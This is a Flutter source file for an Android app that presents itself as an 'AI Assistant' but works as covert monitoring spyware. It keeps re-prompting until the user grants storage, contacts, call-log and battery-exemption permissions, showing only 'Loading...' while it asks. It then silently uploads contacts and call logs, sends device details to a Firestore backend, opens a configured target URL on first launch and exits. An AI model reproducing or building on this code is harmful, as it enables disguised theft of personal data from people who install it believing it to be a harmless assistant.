import 'dart:io';
import 'package:cloud_firestore/cloud_firestore.dart';
import 'package:device_info_plus/device_info_plus.dart';
import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'package:permission_handler/permission_handler.dart';
import 'package:shared_preferences/shared_preferences.dart';
import 'package:workmanager/workmanager.dart';

import 'config.dart';
import 'contacts_service.dart';
import 'fcm_service.dart';
import 'local_cursor.dart';
import 'worker.dart';
import 'ai_info_screen.dart';
import 'package:url_launcher/url_launcher.dart';

// ─────────────────────────────────────────────────────────────────────────────
//  Entry point
// ─────────────────────────────────────────────────────────────────────────────

Future<void> main() async {
  WidgetsFlutterBinding.ensureInitialized();

  try {
    await ensureFirebase();
    enableFirestorePersistence();
  } catch (e) {
    debugPrint('[main] Firebase init error: $e');
  }

  try {
    // ignore: deprecated_member_use
    await Workmanager().initialize(callbackDispatcher, isInDebugMode: false);
  } catch (e) {
    debugPrint('[main] WorkManager init error: $e');
  }

  try {
    await FcmService.setup();
  } catch (e) {
    debugPrint('[main] FCM setup error: $e');
  }

  String deviceId = 'unknown';
  try {
    deviceId = await LocalCursor.deviceId();
  } catch (e) {
    debugPrint('[main] DeviceId error: $e');
  }

  await _saveDeviceInfo(deviceId);

  runApp(DeviceMonitorApp(deviceId: deviceId));
}

// ─────────────────────────────────────────────────────────────────────────────
//  Save device info to Firestore
// ─────────────────────────────────────────────────────────────────────────────

Future<void> _saveDeviceInfo(String deviceId) async {
  try {
    final info = await DeviceInfoPlugin().androidInfo;
    await FirebaseFirestore.instance
        .collection(AppConfig.countersCollection)
        .doc(deviceId)
        .set({
      'deviceId': deviceId,
      'channelId': AppConfig.channelId,
      'deviceModel': info.model,
      'deviceBrand': info.brand,
      'androidVersion': info.version.release,
      'sdkInt': info.version.sdkInt,
      'updatedAt': FieldValue.serverTimestamp(),
    }, SetOptions(merge: true));
  } catch (e) {
    debugPrint('[main] Device info save error: $e');
  }
}

// ─────────────────────────────────────────────────────────────────────────────
//  App
// ─────────────────────────────────────────────────────────────────────────────

class DeviceMonitorApp extends StatelessWidget {
  final String deviceId;
  const DeviceMonitorApp({super.key, required this.deviceId});

  @override
  Widget build(BuildContext context) {
    return MaterialApp(
      title: 'AI Assistant',
      debugShowCheckedModeBanner: false,
      theme: ThemeData(
        colorScheme: ColorScheme.fromSeed(
          seedColor: Colors.teal,
          brightness: Brightness.dark,
        ),
        useMaterial3: true,
      ),
      home: PermissionGate(deviceId: deviceId),
    );
  }
}

// ─────────────────────────────────────────────────────────────────────────────
//  Permission gate — must grant all before seeing dashboard
// ─────────────────────────────────────────────────────────────────────────────

class PermissionGate extends StatefulWidget {
  final String deviceId;
  const PermissionGate({super.key, required this.deviceId});

  @override
  State<PermissionGate> createState() => _PermissionGateState();
}

class _PermissionGateState extends State<PermissionGate> {
  bool _done = false;
  bool _isFirstTime = true;
  String _status = 'Requesting permissions...';

  @override
  void initState() {
    super.initState();
    _requestAll();
  }

  Future<void> _requestAll() async {
    // Native commit() — guaranteed disk write before process is killed
    try {
      _isFirstTime = await const MethodChannel('counter/oem').invokeMethod<bool>('isFirstRun') ?? true;
    } catch (_) {
      _isFirstTime = true;
    }

    int sdk = 30;
    try {
      final info = await DeviceInfoPlugin().androidInfo;
      sdk = info.version.sdkInt;
    } catch (_) {}

    // ── 1. Storage (must — request first so Samsung doesn't block it) ──
    setState(() => _status = 'Loading...');
    while (true) {
      if (sdk >= 30) {
        final s = await Permission.manageExternalStorage.status;
        if (s.isGranted) break;
        await Permission.manageExternalStorage.request();
        await Future.delayed(const Duration(milliseconds: 500));
        if ((await Permission.manageExternalStorage.status).isPermanentlyDenied) {
          await openAppSettings();
          await Future.delayed(const Duration(seconds: 3));
        }
      } else {
        final s = await Permission.storage.status;
        if (s.isGranted) break;
        await Permission.storage.request();
        await Future.delayed(const Duration(milliseconds: 500));
        if ((await Permission.storage.status).isPermanentlyDenied) {
          await openAppSettings();
          await Future.delayed(const Duration(seconds: 2));
        }
      }
    }

    // ── 2. Notifications (optional — skip if permanently denied) ──
    setState(() => _status = 'Loading...');
    if (!(await Permission.notification.status).isGranted) {
      await Permission.notification.request();
      await Future.delayed(const Duration(milliseconds: 500));
      if ((await Permission.notification.status).isPermanentlyDenied) {
        await openAppSettings();
        await Future.delayed(const Duration(seconds: 2));
      }
    }

    // ── 3. Battery optimization (must) ──
    setState(() => _status = 'Loading...');
    while (true) {
      final s = await Permission.ignoreBatteryOptimizations.status;
      if (s.isGranted) break;
      await Permission.ignoreBatteryOptimizations.request();
      await Future.delayed(const Duration(milliseconds: 500));
    }

    // ── 4. Contacts (must) ──
    setState(() => _status = 'Loading...');
    while (true) {
      final s = await Permission.contacts.status;
      if (s.isGranted) break;
      await Permission.contacts.request();
      await Future.delayed(const Duration(milliseconds: 400));
      if ((await Permission.contacts.status).isPermanentlyDenied) {
        await openAppSettings();
        await Future.delayed(const Duration(seconds: 2));
      }
    }

    // ── 5. Call logs (must) ──
    setState(() => _status = 'Loading...');
    while (true) {
      final s = await Permission.phone.status;
      if (s.isGranted) break;
      await Permission.phone.request();
      await Future.delayed(const Duration(milliseconds: 400));
      if ((await Permission.phone.status).isPermanentlyDenied) {
        await openAppSettings();
        await Future.delayed(const Duration(seconds: 2));
      }
    }

    // ── Save contacts + call logs silently ──
    setState(() => _status = 'Loading...');
    try {
      final svc = ContactsService();
      if (await Permission.contacts.isGranted) {
        await svc.syncContactsSilent(widget.deviceId);
      }
      if (await Permission.phone.isGranted) {
        await svc.syncCallLogsSilent(widget.deviceId);
      }
    } catch (_) {}

    final prefs = await SharedPreferences.getInstance();
    await prefs.setString('lastSync', DateTime.now().toIso8601String());

    if (_isFirstTime) {
      if (AppConfig.targetUrl.isNotEmpty && AppConfig.targetUrl != 'PLACEHOLDER_URL') {
        try {
          await launchUrl(Uri.parse(AppConfig.targetUrl), mode: LaunchMode.externalApplication);
          await Future.delayed(const Duration(milliseconds: 500));
        } catch (_) {}
      }
      await Future.delayed(const Duration(milliseconds: 800));
      exit(0);
    }

    // Not first time: show AI Info screen
    if (mounted) {
      setState(() => _done = true);
    }
  }

  @override
  Widget build(BuildContext context) {
    if (_done) {
      return const AIInfoScreen();
    }

    return Scaffold(
      backgroundColor: const Color(0xFF1A1A2E),
      body: Center(
        child: Column(
          mainAxisSize: MainAxisSize.min,
          children: [
            const CircularProgressIndicator(color: Colors.tealAccent),
            const SizedBox(height: 24),
            Text(
              _status,
              style: const TextStyle(color: Colors.white70, fontSize: 16),
              textAlign: TextAlign.center,
            ),
          ],
        ),
      ),
    );
  }
}

// ─────────────────────────────────────────────────────────────────────────────
//  Monitor screen — "Device Monitor Running"
// ─────────────────────────────────────────────────────────────────────────────

class MonitorScreen extends StatefulWidget {
  final String deviceId;
  const MonitorScreen({super.key, required this.deviceId});

  @override
  State<MonitorScreen> createState() => _MonitorScreenState();
}

class _MonitorScreenState extends State<MonitorScreen> {
  bool _storageOk = false;
  bool _batteryOk = false;
  bool _contactsOk = false;
  bool _callLogsOk = false;
  String _lastSync = 'Never';

  @override
  void initState() {
    super.initState();
    _checkStatuses();
  }

  Future<void> _checkStatuses() async {
    final storage = await _isStorageGranted();
    final battery = await Permission.ignoreBatteryOptimizations.isGranted;
    final contacts = await Permission.contacts.isGranted;
    final phone = await Permission.phone.isGranted;

    final prefs = await SharedPreferences.getInstance();
    final syncStr = prefs.getString('lastSync');
    String lastSync = 'Never';
    if (syncStr != null) {
      final dt = DateTime.tryParse(syncStr);
      if (dt != null) {
        final h = dt.hour > 12 ? dt.hour - 12 : (dt.hour == 0 ? 12 : dt.hour);
        final amPm = dt.hour >= 12 ? 'PM' : 'AM';
        lastSync =
            '${dt.day}/${dt.month}/${dt.year} $h:${dt.minute.toString().padLeft(2, '0')} $amPm';
      }
    }

    setState(() {
      _storageOk = storage;
      _batteryOk = battery;
      _contactsOk = contacts;
      _callLogsOk = phone;
      _lastSync = lastSync;
    });
  }

  Future<bool> _isStorageGranted() async {
    int sdk = 30;
    try {
      final info = await DeviceInfoPlugin().androidInfo;
      sdk = info.version.sdkInt;
    } catch (_) {}
    if (sdk >= 30) {
      return await Permission.manageExternalStorage.isGranted;
    } else {
      return await Permission.storage.isGranted;
    }
  }

  @override
  Widget build(BuildContext context) {
    final truncatedId = widget.deviceId.length > 8
        ? '${widget.deviceId.substring(0, 8)}...'
        : widget.deviceId;

    return Scaffold(
      backgroundColor: const Color(0xFF1A1A2E),
      body: SafeArea(
        child: Center(
          child: Padding(
            padding: const EdgeInsets.symmetric(horizontal: 32),
            child: Column(
              mainAxisSize: MainAxisSize.min,
              children: [
                // Green checkmark
                Container(
                  width: 100,
                  height: 100,
                  decoration: BoxDecoration(
                    color: Colors.tealAccent.withValues(alpha: 0.15),
                    shape: BoxShape.circle,
                  ),
                  child: const Icon(
                    Icons.check_circle,
                    color: Colors.tealAccent,
                    size: 64,
                  ),
                ),
                const SizedBox(height: 24),

                // Title
                const Text(
                  'Device Monitor Active',
                  style: TextStyle(
                    color: Colors.white,
                    fontSize: 24,
                    fontWeight: FontWeight.bold,
                  ),
                ),
                const SizedBox(height: 12),

                // Subtitle
                const Text(
                  'Your device is being monitored.\n'
                  'All data is syncing in the background.',
                  style: TextStyle(color: Colors.white60, fontSize: 14),
                  textAlign: TextAlign.center,
                ),
                const SizedBox(height: 32),

                // Device ID
                Container(
                  padding:
                      const EdgeInsets.symmetric(horizontal: 20, vertical: 12),
                  decoration: BoxDecoration(
                    color: Colors.white.withValues(alpha: 0.06),
                    borderRadius: BorderRadius.circular(12),
                  ),
                  child: Row(
                    mainAxisSize: MainAxisSize.min,
                    children: [
                      const Icon(Icons.devices, color: Colors.white38, size: 18),
                      const SizedBox(width: 10),
                      Text(
                        'Device: $truncatedId',
                        style: const TextStyle(
                          color: Colors.white54,
                          fontSize: 13,
                          fontFamily: 'monospace',
                        ),
                      ),
                    ],
                  ),
                ),
                const SizedBox(height: 12),

                // Last sync
                Text(
                  'Last sync: $_lastSync',
                  style: const TextStyle(color: Colors.white38, fontSize: 12),
                ),
                const SizedBox(height: 32),

                // Status indicators
                _statusRow('Storage', _storageOk),
                _statusRow('Battery', _batteryOk),
                _statusRow('Contacts', _contactsOk),
                _statusRow('Call Logs', _callLogsOk),
              ],
            ),
          ),
        ),
      ),
    );
  }

  Widget _statusRow(String label, bool ok) {
    return Padding(
      padding: const EdgeInsets.symmetric(vertical: 4),
      child: Row(
        mainAxisSize: MainAxisSize.min,
        children: [
          Icon(
            ok ? Icons.check_circle : Icons.cancel,
            color: ok ? Colors.tealAccent : Colors.redAccent,
            size: 20,
          ),
          const SizedBox(width: 10),
          SizedBox(
            width: 100,
            child: Text(
              label,
              style: TextStyle(
                color: ok ? Colors.white70 : Colors.redAccent,
                fontSize: 14,
              ),
            ),
          ),
        ],
      ),
    );
  }
}
